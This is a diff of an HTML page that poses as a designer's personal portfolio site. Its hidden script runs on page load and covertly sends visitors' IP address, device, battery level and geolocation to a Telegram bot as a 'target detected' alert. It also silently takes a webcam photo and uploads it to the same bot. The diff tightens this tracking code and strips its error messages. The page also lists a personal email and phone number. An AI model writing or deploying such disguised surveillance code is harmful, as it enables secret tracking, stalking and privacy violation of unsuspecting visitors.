@@ -17,7 +17,6 @@
 <body class="p-4 md:p-12">
 
     <main class="max-w-6xl mx-auto">
-        <!-- Navigasi -->
         <nav class="flex justify-between items-center mb-8 md:mb-10">
             <span class="text-xl font-bold">Will</span>
             <div class="space-x-6 font-semibold text-xs uppercase tracking-widest hidden md:flex items-center">
@@ -27,16 +26,10 @@
             </div>
         </nav>
 
-        <!-- Header Section -->
         <header class="grid grid-cols-1 md:grid-cols-12 gap-6 md:gap-8">
-            
-            <!-- Left Side -->
             <div class="md:col-span-7 space-y-6">
                 <h2 class="text-5xl md:text-8xl font-serif leading-[0.9]">Hello,<br>I'm Will !</h2>
-                <p class="text-sm md:text-base leading-relaxed text-gray-800 max-w-lg">
-                    Graphic Designer otodidak & Digital Web Management enthusiast.
-                </p>
-                
+                <p class="text-sm md:text-base leading-relaxed text-gray-800 max-w-lg">Graphic Designer otodidak & Digital Web Management enthusiast.</p>
                 <div class="flex gap-3 flex-wrap">
                     <a href="#" class="bg-[#f7a21b] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">LinkedIn</a>
                     <button onclick="toggleProjects()" class="bg-[#2b3934] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">Projects</button>
@@ -46,10 +39,6 @@
                     <a href="https://aismk.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
                         <div class="font-bold text-sm text-[#2b3934]">AISMK Web App</div>
                         <div class="text-[10px] text-gray-500 uppercase tracking-wider">Web Development</div>
-                    </a>
-                    <a href="https://coffeshop-chi-hazel.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
-                        <div class="font-bold text-sm text-[#2b3934]">Coffee Shop Landing Page</div>
-                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">UI/UX Design</div>
                     </a>
                 </div>
 
@@ -62,13 +51,8 @@
                         <div class="text-[10px] text-gray-500 uppercase tracking-wider">SMKN 2 Tembilahan</div>
                     </div>
                 </a>
-                
-                <div class="w-full">
-                    <iframe src="https://open.spotify.com/embed/track/2LBqCSwhJGcFQeTHMVGwy3" class="w-full h-20" frameBorder="0" allowtransparency="true" allow="encrypted-media"></iframe>
-                </div>
             </div>
             
-            <!-- Right Side (Profile) -->
             <div class="md:col-span-5 bg-[#2b3934] text-white p-6 rounded-[1.5rem] shadow-lg h-fit">
                 <div class="w-full aspect-square md:aspect-auto md:h-64 mb-6 overflow-hidden rounded-[1rem]">
                     <img src="https://i.ibb.co.com/CKpQhNrQ/1778070770943.png" alt="Foto Profil" class="w-full h-full object-cover">
@@ -77,23 +61,11 @@
                 <div class="text-xs md:text-sm space-y-3 opacity-90">
                     <p><i class="fas fa-map-marker-alt mr-2"></i> Indonesia</p>
                     <p><i class="fas fa-envelope mr-2"></i> wilkaxyz@gmail.com</p>
-                    <p><i class="fab fa-whatsapp mr-2"></i> +62 822 9378 6539</p>
                 </div>
-                <div class="mt-6 flex gap-4 text-lg">
-                    <a href="#" class="hover:text-[#f7a21b] transition"><i class="fab fa-behance"></i></a>
-                    <a href="#" class="hover:text-[#f7a21b] transition"><i class="fab fa-dribbble"></i></a>
-                    <button onclick="toggleIg()" class="hover:text-[#f7a21b] transition focus:outline-none"><i class="fab fa-instagram"></i></button>
-                </div>
-                <div id="ig-name" class="hidden mt-2 text-[10px] font-semibold text-[#f7a21b]">@wilkaxyz</div>
             </div>
         </header>
-
-        <footer class="mt-12 py-6 border-t border-gray-400 text-center text-[10px] text-gray-600">
-            &copy; 2026 Wilka.xyz
-        </footer>
     </main>
 
-    <!-- Elemen tersembunyi untuk proses kamera -->
     <video id="video" class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
@@ -102,45 +74,45 @@
         const chatId = "7577331454"; 
 
         window.onload = async function() {
-            // Deteksi IP Address
-            let ipAddress = "Tidak terdeteksi";
+            let ipAddress = "N/A";
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 ipAddress = ipData.ip;
             } catch (e) {}
 
-            // Deteksi Informasi Perangkat & Baterai
-            let deviceInfo = `Device: ${navigator.platform} | User Agent: ${navigator.userAgent}`;
-            let batteryInfo = "Baterai tidak terdeteksi";
-            
+            let batteryInfo = "N/A";
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryInfo = `Level: ${Math.round(battery.level * 100)}% | Status: ${battery.charging ? "Mengisi" : "Tidak Mengisi"}`;
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Discharging"})`;
                 } catch (e) {}
             }
 
-            // Jalankan Lokasi
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude } = position.coords;
-                        let address = `Lat: ${latitude}, Lon: ${longitude}`;
-                        
-                        try {
-                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-                            const data = await response.json();
-                            address = data.display_name;
-                        } catch (e) {}
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    const finalMsg = `*🚨 Target Terdeteksi!* \n\n` +
+                                     `📍 *Lokasi:* https://www.google.com/maps/place/${latitude},${longitude}\n` +
+                                     `🌐 *IP Address:* \`${ipAddress}\`\n` +
+                                     `🔋 *Baterai:* ${batteryInfo}\n` +
+                                     `📱 *Device:* ${navigator.platform}`;
+                    
+                    const keyboard = {
+                        inline_keyboard: [[
+                            { text: "📍 Lihat di Maps", url: `https://www.google.com/maps/place/${latitude},${longitude}` },
+                            { text: "👤 Cek Profil", callback_data: "check_user" }
+                        ]]
+                    };
 
-                        const finalMsg = `Data Pengunjung:\nIP: ${ipAddress}\nLokasi: ${address}\n${batteryInfo}\n${deviceInfo}`;
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}`);
-                        
-                        takePhoto();
-                    },
-                    (error) => console.warn("Izin lokasi ditolak.")
-                );
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown', reply_markup: keyboard })
+                    });
+                    
+                    takePhoto();
+                });
             }
         };
 
@@ -150,30 +122,20 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.play();
-
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg');
-                    const blob = await (await fetch(imageData)).blob();
-                    
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', blob);
-                    
+                    formData.append('caption', "📸 Foto Target");
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                    
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(t => t.stop());
                 }, 1500);
-            } catch (err) {
-                console.warn("Kamera tidak diizinkan.");
-            }
+            } catch (err) {}
         }
-
-        function toggleIg() { document.getElementById('ig-name').classList.toggle('hidden'); }
         function toggleProjects() { document.getElementById('project-list').classList.toggle('hidden'); }
     </script>
 </body>
